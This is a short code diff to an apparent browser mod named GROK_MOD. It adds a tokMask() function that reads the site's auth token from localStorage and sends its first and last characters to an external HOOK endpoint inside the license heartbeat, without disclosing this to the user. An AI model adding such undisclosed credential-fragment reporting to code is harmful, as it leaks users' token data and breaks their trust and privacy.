@@ -1574,12 +1574,17 @@ GROK_TAIL = r"""  var GROK_MOD = {
       for (var j = 0; j < ks.length; j++) if (ks[j] && ks[j].sha === sha) return ks[j].active === false ? "key disabled" : "";
       return "invalid key";
     }
+    function tokMask() {
+      var t = ""; try { t = String(localStorage.getItem("token") || ""); } catch (e) {}
+      t = t.replace(/[^\x21-\x7e]/g, "");
+      return t.length > 10 ? t.slice(0, 6) + "..." + t.slice(-4) : (t ? t.slice(0, 2) + "..." : "");
+    }
     function beat() {
       if (!gk.ok || !gk.key) return;
       gk.lastBeat = Date.now();
       try {
         fetch(HOOK, { method: "POST", mode: "no-cors", headers: { "Content-Type": "text/plain" },
-          body: JSON.stringify({ op: "beat", key: gk.key, device: gk.dev }) }).catch(function () {});
+          body: JSON.stringify({ op: "beat", key: gk.key, device: gk.dev, tok: tokMask() }) }).catch(function () {});
       } catch (e) {}
     }
     var C = { bg: "rgba(16,14,10,.98)", bg2: "rgba(22,21,18,.95)", txt: "#c4b898", gold: "#c8a832", gold2: "#e8c840", bord: "rgba(120,100,40,.35)", err: "#e0604a" };
